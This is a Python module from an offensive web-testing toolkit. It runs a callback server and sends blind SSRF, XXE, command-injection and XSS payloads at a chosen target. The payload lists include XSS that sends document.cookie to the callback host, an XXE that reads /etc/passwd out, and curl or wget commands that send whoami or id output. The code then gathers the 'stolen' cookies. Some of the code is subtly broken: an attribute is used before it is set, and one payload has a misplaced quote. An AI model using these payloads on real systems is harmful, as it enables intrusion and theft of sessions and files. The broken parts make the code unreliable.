#!/usr/bin/env python3
"""
ZYLON FUSION v5.0.0 - OAST/Callback Engine
=============================================
Fused from: Interactsh (https://github.com/projectdiscovery/interactsh)
           + EzXSS (https://github.com/ssl/ezXSS)
           + XSSHunter (https://github.com/mandatoryprogrammer/xsshunter)
           + Custom Zylon Techniques
Capabilities:
  - Out-of-band interaction detection (DNS, HTTP, HTTPS)
  - Blind vulnerability detection via callback
  - Self-hosted callback server simulation (simple HTTP server)
  - DNS interaction tracking
  - Blind XSS callback management
  - SSRF callback testing
  - XXE callback testing
  - Command injection callback testing
  - Payload generation with unique identifiers
  - Interaction logging and correlation
Termux Compatible | No Root Required | Python 3.13+
"""

import os
import sys
import json
import time
import uuid
import socket
import threading
import hashlib
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, urljoin, quote

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from core.var import (
    USER_AGENTS, DEFAULT_TIMEOUT, MAX_THREADS
)

from core.shared_infra import OOBProvider, PayloadInjector, shared_session

# ============================================================================
# ANSI COLOR CODES (Termux-compatible)
# ============================================================================

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
BOLD = '\033[1m'
DIM = '\033[2m'
RESET = '\033[0m'

# ============================================================================
# PAYLOAD TEMPLATES
# ============================================================================

BLIND_SSRF_PAYLOADS = [
    "{callback_url}",
    "http://{callback_host}",
    "http://{callback_host}/ssrf",
    "http://{callback_host}:{callback_port}/ssrf-test",
    "http://127.0.0.1:22?url={callback_url}",
    "http://[::1]:80/?cb={callback_url}",
]

BLIND_XXE_PAYLOADS = [
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{callback_url}/xxe">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % dtd SYSTEM "{callback_url}/xxe.dtd"> %dtd;]><data>&send;</data>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'{callback_url}/?d=%xxe;\'>">%eval;%exfil;]><foo/>',
]

BLIND_CMDI_PAYLOADS = [
    "curl {callback_url}/cmdi",
    "wget {callback_url}/cmdi",
    "ping -c 1 {callback_host}",
    "nslookup {callback_host}",
    "curl http://{callback_host}:{callback_port}/cmdi-$(whoami)",
    "ping -c 1 {callback_host}-$(id|tr \'/\' \'-\')",
    "curl {callback_url}/cmdi-$(hostname)",
    "wget -q -O - {callback_url}/cmdi-$(cat /etc/hostname)",
]

BLIND_XSS_PAYLOADS = [
    '<script src="{callback_url}/xss"></script>',
    '"><script src="{callback_url}/xss"></script>',
    "'-alert(1)-'<script src=\"{callback_url}/xss\"></script>",
    '<img src=x onerror="fetch(\'{callback_url}/xss?c=\'+document.cookie)">',
    '<svg onload="fetch(\'{callback_url}/xss?c=\'+document.cookie)">',
    '"><img src=x onerror="new Image().src=\'{callback_url}/xss?c=\'+document.cookie">',
    "<script>new Image().src='{callback_url}/xss?cookie='+document.cookie+'</script>",
    '<body onload="fetch(\'{callback_url}/xss?loc=\'+document.location)">',
]

# ============================================================================
# CALLBACK HTTP SERVER
# ============================================================================

class CallbackRequestHandler(BaseHTTPRequestHandler):
    """HTTP request handler for OAST callback server"""

    # Class-level storage for interactions (shared across handler instances)
    interactions = {}
    interactions_lock = threading.Lock()

    def log_message(self, format, *args):
        """Suppress default logging"""
        pass

    def do_GET(self):
        """Handle GET requests (callback interactions)"""
        interaction = {
            "timestamp": datetime.now().isoformat(),
            "method": "GET",
            "path": self.path,
            "client_ip": self.client_address[0],
            "headers": dict(self.headers),
        }

        # Extract payload ID from path
        path_parts = self.path.strip('/').split('/')
        payload_id = path_parts[0] if path_parts else "unknown"

        with CallbackRequestHandler.interactions_lock:
            if payload_id not in CallbackRequestHandler.interactions:
                CallbackRequestHandler.interactions[payload_id] = []
            CallbackRequestHandler.interactions[payload_id].append(interaction)

        print(f"{GREEN}[OAST-CALLBACK] GET {self.path} from {self.client_address[0]}{RESET}")

        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(b"OK")

    def do_POST(self):
        """Handle POST requests (callback interactions)"""
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length) if content_length else b''

        interaction = {
            "timestamp": datetime.now().isoformat(),
            "method": "POST",
            "path": self.path,
            "client_ip": self.client_address[0],
            "headers": dict(self.headers),
            "body": body.decode('utf-8', errors='replace')[:4096],
        }

        path_parts = self.path.strip('/').split('/')
        payload_id = path_parts[0] if path_parts else "unknown"

        with CallbackRequestHandler.interactions_lock:
            if payload_id not in CallbackRequestHandler.interactions:
                CallbackRequestHandler.interactions[payload_id] = []
            CallbackRequestHandler.interactions[payload_id].append(interaction)

        print(f"{GREEN}[OAST-CALLBACK] POST {self.path} from {self.client_address[0]}{RESET}")

        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(b"OK")

    def do_OPTIONS(self):
        """Handle OPTIONS requests (CORS preflight)"""
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', '*')
        self.end_headers()


# ============================================================================
# OAST ENGINE
# ============================================================================

class OASTEngine:
    """OAST/Callback Engine - Fused from Interactsh + EzXSS + XSSHunter + Custom Techniques"""

    def __init__(self, callback_host=None, callback_port=8080, timeout=DEFAULT_TIMEOUT,
                 threads=MAX_THREADS, proxy=None):
        self.callback_host = callback_host or self._detect_external_ip()
        self.callback_port = callback_port
        self.timeout = timeout
        self.threads = threads
        self.proxy = proxy
        self.session = shared_session
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': USER_AGENTS[0] if USER_AGENTS else 'Mozilla/5.0'
        })
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}

        self.lock = threading.Lock()
        self.callback_server = None
        self.callback_thread = None
        self.payload_registry = {}  # payload_id -> metadata
        self.interactions_log = []  # All interactions

        # Try to use cloud OOB provider instead of hardcoded localhost
        self.oob_provider = OOBProvider()
        self.oob_provider.initialize()

    def _print(self, msg, color=CYAN):
        """Thread-safe colored print"""
        with self.lock:
            print(f"{color}{msg}{RESET}")

    def _detect_external_ip(self):
        """Try to detect external IP for callback configuration"""
        # Try OOB provider first
        if self.oob_provider.provider and self.oob_provider.provider != 'local':
            callback_url = self.oob_provider.get_callback_url(self.generate_payload_id())
            if callback_url and '127.0.0.1' not in callback_url:
                from urllib.parse import urlparse
                return urlparse(callback_url).hostname
        # Fallback to ipify
        try:
            resp = requests.get('https://api.ipify.org', timeout=5)
            if resp.status_code == 200:
                return resp.text.strip()
        except Exception:
            pass
        return "127.0.0.1"

    # ========================================================================
    # CALLBACK SERVER MANAGEMENT
    # ========================================================================

    def start_callback_server(self, port=8080):
        """Start HTTP callback server for out-of-band interaction detection

        Args:
            port: Port to listen on (default 8080)

        Returns:
            dict with server status info
        """
        self.callback_port = port
        result = {
            "running": False,
            "host": self.callback_host,
            "port": port,
            "url": f"http://{self.callback_host}:{port}",
            "findings": [],
        }

        if self.callback_server is not None:
            result["findings"].append({
                "type": "info",
                "description": "Callback server already running",
            })
            return result

        try:
            self.callback_server = HTTPServer(('0.0.0.0', port), CallbackRequestHandler)
            self.callback_server.timeout = 0.5
            self.callback_thread = threading.Thread(
                target=self._serve_callback,
                daemon=True,
                name="oast-callback-server"
            )
            self.callback_thread.start()

            result["running"] = True
            result["findings"].append({
                "type": "callback_server_started",
                "severity": "Info",
                "description": f"OAST callback server started on {self.callback_host}:{port}",
                "callback_url": f"http://{self.callback_host}:{port}",
            })

            self._print(f"  [+] OAST callback server started on port {port}", GREEN)
            self._print(f"  [+] Callback URL: http://{self.callback_host}:{port}/{{payload_id}}/", CYAN)

        except OSError as e:
            result["findings"].append({
                "type": "error",
                "description": f"Failed to start callback server on port {port}: {e}",
            })
            self._print(f"  [!] Failed to start callback server: {e}", RED)

        return result

    def _serve_callback(self):
        """Internal: Run the callback server loop"""
        while self.callback_server:
            try:
                self.callback_server.handle_request()
            except Exception:
                break

    def stop_callback_server(self):
        """Stop the callback server"""
        if self.callback_server:
            self.callback_server.shutdown()
            self.callback_server = None
            self.callback_thread = None
            self._print("  [*] OAST callback server stopped", YELLOW)

    # ========================================================================
    # PAYLOAD GENERATION
    # ========================================================================

    def generate_payload_id(self):
        """Generate unique ID for each test

        Returns:
            str: 8-character unique identifier
        """
        payload_id = uuid.uuid4().hex[:8]
        self.payload_registry[payload_id] = {
            "created": datetime.now().isoformat(),
            "interactions": [],
        }
        return payload_id

    def _build_callback_url(self, payload_id):
        """Build full callback URL for a given payload ID"""
        return f"http://{self.callback_host}:{self.callback_port}/{payload_id}"

    def _generate_payloads(self, payload_templates, payload_id):
        """Generate concrete payloads from templates"""
        callback_url = self._build_callback_url(payload_id)
        callback_host = self.callback_host
        callback_port = str(self.callback_port)

        payloads = []
        for template in payload_templates:
            payload = template.replace("{callback_url}", callback_url)
            payload = payload.replace("{callback_host}", callback_host)
            payload = payload.replace("{callback_port}", callback_port)
            payloads.append(payload)

        return payloads

    # ========================================================================
    # BLIND SSRF TESTING
    # ========================================================================

    def test_blind_ssrf(self, url, param=None):
        """Blind SSRF via callback

        Tests if the target makes outbound HTTP requests that can be
        detected via the OAST callback server.

        Args:
            url: Target URL to test
            param: Specific parameter to inject (if None, tests common params)

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  Blind SSRF Testing via OAST Callback{RESET}", CYAN)
        self._print(f"  [*] Target: {url}", CYAN)

        payload_id = self.generate_payload_id()
        payloads = self._generate_payloads(BLIND_SSRF_PAYLOADS, payload_id)

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "url": url,
                "param": param,
                "payload_id": payload_id,
                "payloads_sent": len(payloads),
                "callback_url": self._build_callback_url(payload_id),
            },
            "scan_type": "oast_blind_ssrf",
        }

        # Ensure callback server is running
        if not self.callback_server:
            self.start_callback_server(self.callback_port)

        params_to_test = [param] if param else ['url', 'redirect', 'next', 'link',
                                                  'target', 'rurl', 'dest', 'uri',
                                                  'path', 'continue', 'return', 'goto']

        for test_param in params_to_test:
            for payload in payloads:
                try:
                    # Test as GET parameter
                    test_url = url
                    separator = '&' if '?' in url else '?'
                    full_url = f"{test_url}{separator}{test_param}={quote(payload)}"

                    resp = self.session.get(full_url, timeout=self.timeout, verify=False,
                                           allow_redirects=False)

                    self._print(f"  [*] Sent SSRF payload via param '{test_param}': {payload[:60]}...", DIM + CYAN)

                    # Also test as POST parameter
                    try:
                        self.session.post(url, data={test_param: payload},
                                         timeout=self.timeout, verify=False,
                                         allow_redirects=False)
                    except Exception:
                        pass

                    # Also test as JSON body
                    try:
                        self.session.post(url, json={test_param: payload},
                                         timeout=self.timeout, verify=False,
                                         allow_redirects=False)
                    except Exception:
                        pass

                    time.sleep(0.1)

                except Exception as e:
                    self._print(f"  [-] Request failed: {str(e)[:50]}", DIM)
                    continue

        # Wait for callbacks
        self._print(f"  [*] Waiting for SSRF callbacks (5s)...", YELLOW)
        time.sleep(5)

        # Check for interactions
        interactions = self.check_interactions(payload_id)
        if interactions:
            result["vulnerable"] = True
            result["details"]["interactions"] = interactions
            result["findings"].append({
                "type": "blind_ssrf",
                "severity": "High",
                "payload_id": payload_id,
                "interaction_count": len(interactions),
                "description": f"Blind SSRF detected! Target made {len(interactions)} "
                              f"callback(s) to OAST server. This indicates the server "
                              f"processes and makes outbound requests from user-supplied URLs.",
                "interactions": interactions[:5],
            })
            self._print(f"  [!!!] BLIND SSRF DETECTED! {len(interactions)} callback(s) received!", RED)
        else:
            self._print(f"  [-] No SSRF callbacks received", GREEN)

        return result

    # ========================================================================
    # BLIND XXE TESTING
    # ========================================================================

    def test_blind_xxe(self, url):
        """Blind XXE via callback

        Tests if the target parses XML and makes outbound connections
        that can be detected via the OAST callback server.

        Args:
            url: Target URL that accepts XML input

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  Blind XXE Testing via OAST Callback{RESET}", CYAN)
        self._print(f"  [*] Target: {url}", CYAN)

        payload_id = self.generate_payload_id()
        payloads = self._generate_payloads(BLIND_XXE_PAYLOADS, payload_id)

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "url": url,
                "payload_id": payload_id,
                "payloads_sent": len(payloads),
                "callback_url": self._build_callback_url(payload_id),
            },
            "scan_type": "oast_blind_xxe",
        }

        # Ensure callback server is running
        if not self.callback_server:
            self.start_callback_server(self.callback_port)

        for i, payload in enumerate(payloads):
            try:
                headers = {
                    'Content-Type': 'application/xml',
                    'User-Agent': USER_AGENTS[0] if USER_AGENTS else 'Mozilla/5.0',
                }

                resp = self.session.post(url, data=payload, headers=headers,
                                        timeout=self.timeout, verify=False,
                                        allow_redirects=False)

                self._print(f"  [*] Sent XXE payload #{i+1} (status: {resp.status_code})", DIM + CYAN)

                # Also try SOAP endpoint
                soap_payload = f"""<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{self._build_callback_url(payload_id)}/soap-xxe">]><foo>&xxe;</foo></soap:Body></soap:Envelope>"""
                soap_headers = {
                    'Content-Type': 'text/xml',
                    'SOAPAction': '""',
                    'User-Agent': USER_AGENTS[0] if USER_AGENTS else 'Mozilla/5.0',
                }
                try:
                    self.session.post(url, data=soap_payload, headers=soap_headers,
                                     timeout=self.timeout, verify=False,
                                     allow_redirects=False)
                except Exception:
                    pass

                time.sleep(0.1)

            except Exception as e:
                self._print(f"  [-] XXE request failed: {str(e)[:50]}", DIM)
                continue

        # Wait for callbacks
        self._print(f"  [*] Waiting for XXE callbacks (5s)...", YELLOW)
        time.sleep(5)

        interactions = self.check_interactions(payload_id)
        if interactions:
            result["vulnerable"] = True
            result["details"]["interactions"] = interactions
            result["findings"].append({
                "type": "blind_xxe",
                "severity": "Critical",
                "payload_id": payload_id,
                "interaction_count": len(interactions),
                "description": f"Blind XXE detected! Target made {len(interactions)} "
                              f"callback(s) to OAST server after XML parsing. "
                              f"This indicates XML external entity processing is enabled.",
                "interactions": interactions[:5],
            })
            self._print(f"  [!!!] BLIND XXE DETECTED! {len(interactions)} callback(s) received!", RED)
        else:
            self._print(f"  [-] No XXE callbacks received", GREEN)

        return result

    # ========================================================================
    # BLIND COMMAND INJECTION TESTING
    # ========================================================================

    def test_blind_cmdi(self, url, param=None):
        """Blind command injection via callback

        Tests if the target executes OS commands and makes outbound
        connections detectable via the OAST callback server.

        Args:
            url: Target URL to test
            param: Specific parameter to inject

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  Blind Command Injection Testing via OAST Callback{RESET}", CYAN)
        self._print(f"  [*] Target: {url}", CYAN)

        payload_id = self.generate_payload_id()
        payloads = self._generate_payloads(BLIND_CMDI_PAYLOADS, payload_id)

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "url": url,
                "param": param,
                "payload_id": payload_id,
                "payloads_sent": len(payloads),
                "callback_url": self._build_callback_url(payload_id),
            },
            "scan_type": "oast_blind_cmdi",
        }

        # Ensure callback server is running
        if not self.callback_server:
            self.start_callback_server(self.callback_port)

        params_to_test = [param] if param else ['cmd', 'exec', 'command', 'execute',
                                                  'ping', 'query', 'jump', 'code',
                                                  'reg', 'do', 'func', 'arg']

        for test_param in params_to_test:
            for payload in payloads:
                try:
                    # GET parameter
                    separator = '&' if '?' in url else '?'
                    full_url = f"{url}{separator}{test_param}={quote(payload)}"

                    resp = self.session.get(full_url, timeout=self.timeout, verify=False,
                                           allow_redirects=False)

                    self._print(f"  [*] Sent CmdI payload via '{test_param}': {payload[:50]}...", DIM + CYAN)

                    # POST parameter
                    try:
                        self.session.post(url, data={test_param: payload},
                                         timeout=self.timeout, verify=False,
                                         allow_redirects=False)
                    except Exception:
                        pass

                    # Header injection (X-Forwarded-For, User-Agent)
                    # TODO: This should use shared_session in the future
                    # to avoid thread-unsafe cookie modifications on self.session
                    try:
                        header_payloads = {
                            'X-Forwarded-For': payload,
                            'X-Real-IP': payload,
                            'User-Agent': payload,
                            'Referer': payload,
                        }
                        self.session.get(url, headers=header_payloads,
                                        timeout=self.timeout, verify=False,
                                        allow_redirects=False)
                    except Exception:
                        pass

                    time.sleep(0.1)

                except Exception as e:
                    self._print(f"  [-] Request failed: {str(e)[:50]}", DIM)
                    continue

        # Wait for callbacks
        self._print(f"  [*] Waiting for CmdI callbacks (8s)...", YELLOW)
        time.sleep(8)

        interactions = self.check_interactions(payload_id)
        if interactions:
            result["vulnerable"] = True
            result["details"]["interactions"] = interactions

            # Analyze interactions for OS info
            os_info = None
            for interaction in interactions:
                path = interaction.get("path", "")
                if "cmdi-" in path:
                    parts = path.split("cmdi-")
                    if len(parts) > 1:
                        os_info = parts[1].strip("/")

            desc = f"Blind Command Injection detected! Target made {len(interactions)} callback(s)."
            if os_info:
                desc += f" OS info extracted: {os_info}"

            result["findings"].append({
                "type": "blind_cmdi",
                "severity": "Critical",
                "payload_id": payload_id,
                "interaction_count": len(interactions),
                "os_info": os_info,
                "description": desc,
                "interactions": interactions[:5],
            })
            self._print(f"  [!!!] BLIND COMMAND INJECTION DETECTED! {len(interactions)} callback(s)!", RED)
            if os_info:
                self._print(f"  [!!!] OS Info: {os_info}", RED)
        else:
            self._print(f"  [-] No CmdI callbacks received", GREEN)

        return result

    # ========================================================================
    # BLIND XSS TESTING
    # ========================================================================

    def test_blind_xss(self, url):
        """Blind XSS via callback

        Injects XSS payloads that will fire when an admin/internal user
        views the injected content, detected via the OAST callback.

        Args:
            url: Target URL to test (e.g., contact form, support ticket)

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  Blind XSS Testing via OAST Callback{RESET}", CYAN)
        self._print(f"  [*] Target: {url}", CYAN)

        payload_id = self.generate_payload_id()
        payloads = self._generate_payloads(BLIND_XSS_PAYLOADS, payload_id)

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "url": url,
                "payload_id": payload_id,
                "payloads_sent": len(payloads),
                "callback_url": self._build_callback_url(payload_id),
            },
            "scan_type": "oast_blind_xss",
        }

        # Ensure callback server is running
        if not self.callback_server:
            self.start_callback_server(self.callback_port)

        # Test common input fields
        input_fields = ['name', 'username', 'email', 'message', 'comment',
                        'title', 'subject', 'description', 'query', 'search',
                        'feedback', 'report', 'note']

        for field in input_fields:
            for i, payload in enumerate(payloads[:3]):  # Limit to 3 payloads per field
                try:
                    data = {field: payload}
                    # Also add CSRF-like fields
                    for other_field in ['email', 'name']:
                        if other_field != field:
                            data[other_field] = f"test{payload_id}@example.com" if other_field == 'email' else f"test_{payload_id}"

                    resp = self.session.post(url, data=data, timeout=self.timeout,
                                            verify=False, allow_redirects=True)

                    self._print(f"  [*] Sent Blind XSS payload via '{field}': {payload[:50]}...", DIM + CYAN)
                    time.sleep(0.1)

                except Exception as e:
                    continue

        # Note: Blind XSS may take time to trigger (admin review)
        self._print(f"  [*] Blind XSS payloads injected. Callbacks may arrive later.", YELLOW)
        self._print(f"  [*] Checking for immediate callbacks (5s)...", YELLOW)
        time.sleep(5)

        interactions = self.check_interactions(payload_id)
        if interactions:
            result["vulnerable"] = True
            result["details"]["interactions"] = interactions

            # Extract cookie/location data from interactions
            stolen_data = []
            for interaction in interactions:
                path = interaction.get("path", "")
                if "cookie=" in path:
                    stolen_data.append({"type": "cookie", "value": path.split("cookie=")[1][:100]})
                if "loc=" in path:
                    stolen_data.append({"type": "location", "value": path.split("loc=")[1][:100]})

            result["findings"].append({
                "type": "blind_xss",
                "severity": "Critical",
                "payload_id": payload_id,
                "interaction_count": len(interactions),
                "stolen_data": stolen_data,
                "description": f"Blind XSS confirmed! {len(interactions)} callback(s) received. "
                              f"An admin/internal user triggered the XSS payload.",
                "interactions": interactions[:5],
            })
            self._print(f"  [!!!] BLIND XSS CONFIRMED! {len(interactions)} callback(s) received!", RED)
        else:
            self._print(f"  [-] No immediate XSS callbacks (may trigger later)", YELLOW)
            result["findings"].append({
                "type": "info",
                "severity": "Info",
                "description": "No immediate callbacks. Blind XSS payloads injected - "
                              "callbacks may arrive when admin views the content.",
                "payload_id": payload_id,
                "callback_url": self._build_callback_url(payload_id),
            })

        return result

    # ========================================================================
    # INTERACTION CHECKING
    # ========================================================================

    def check_interactions(self, payload_id):
        """Check for interactions on a specific payload ID

        Args:
            payload_id: The unique identifier to check interactions for

        Returns:
            list of interaction records
        """
        interactions = []

        # Check local callback server interactions
        with CallbackRequestHandler.interactions_lock:
            if payload_id in CallbackRequestHandler.interactions:
                interactions = list(CallbackRequestHandler.interactions[payload_id])

        # Update payload registry
        if payload_id in self.payload_registry:
            self.payload_registry[payload_id]["interactions"] = interactions
            self.payload_registry[payload_id]["last_checked"] = datetime.now().isoformat()

        # Log interactions
        for interaction in interactions:
            self.interactions_log.append({
                "payload_id": payload_id,
                **interaction,
            })

        return interactions

    # ========================================================================
    # MAIN ENTRY POINT
    # ========================================================================

    def run(self, target, scan_type='full', **kwargs):
        """Main entry point for OAST Engine

        Args:
            target: Target URL
            scan_type: Type of scan to run
                - 'ssrf': Blind SSRF test
                - 'xxe': Blind XXE test
                - 'cmdi': Blind command injection test
                - 'xss': Blind XSS test
                - 'callback_server': Start callback server only
                - 'full': Run all blind tests
        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}═══════════════════════════════════════════════════{RESET}", CYAN)
        self._print(f"{BOLD}{CYAN}  OAST/CALLBACK ENGINE - v5.0.0{RESET}", CYAN)
        self._print(f"{BOLD}{CYAN}  Fused from: Interactsh + EzXSS + XSSHunter{RESET}", CYAN)
        self._print(f"{BOLD}{CYAN}═══════════════════════════════════════════════════{RESET}", CYAN)

        url = target if target.startswith('http') else f"https://{target}"

        # Ensure callback server is running for scan types
        if scan_type != 'callback_server':
            if not self.callback_server:
                port = kwargs.get('callback_port', 8080)
                self.start_callback_server(port)

        scan_map = {
            'ssrf': lambda: self.test_blind_ssrf(url, kwargs.get('param')),
            'xxe': lambda: self.test_blind_xxe(url),
            'cmdi': lambda: self.test_blind_cmdi(url, kwargs.get('param')),
            'xss': lambda: self.test_blind_xss(url),
            'callback_server': lambda: self.start_callback_server(
                kwargs.get('callback_port', 8080)
            ),
        }

        if scan_type == 'full':
            # Run all tests
            all_findings = []
            all_details = {}
            any_vulnerable = False

            tests = [
                ("Blind SSRF", lambda: self.test_blind_ssrf(url, kwargs.get('param'))),
                ("Blind XXE", lambda: self.test_blind_xxe(url)),
                ("Blind CmdI", lambda: self.test_blind_cmdi(url, kwargs.get('param'))),
                ("Blind XSS", lambda: self.test_blind_xss(url)),
            ]

            for test_name, test_func in tests:
                self._print(f"\n  {BOLD}{YELLOW}[Phase] {test_name}{RESET}", YELLOW)
                try:
                    test_result = test_func()
                    if test_result.get('vulnerable'):
                        any_vulnerable = True
                    all_findings.extend(test_result.get('findings', []))
                    all_details[test_name] = test_result.get('details', {})
                except Exception as e:
                    all_details[test_name] = {"error": str(e)}

            return {
                'vulnerable': any_vulnerable,
                'findings': all_findings,
                'details': all_details,
                'scan_type': 'oast_full',
            }

        scan_func = scan_map.get(scan_type)
        if scan_func:
            return scan_func()

        return {
            'vulnerable': False,
            'findings': [],
            'details': {"error": f"Unknown scan type: {scan_type}"},
            'scan_type': scan_type,
        }


# ============================================================================
# MODULE-LEVEL RUN FUNCTION (ZYLON FUSION INTEGRATION)
# ============================================================================

def run(target, scan_type='full', **kwargs):
    """Module-level run function for ZYLON FUSION integration"""
    engine = OASTEngine()
    return engine.run(target, scan_type=scan_type, **kwargs)
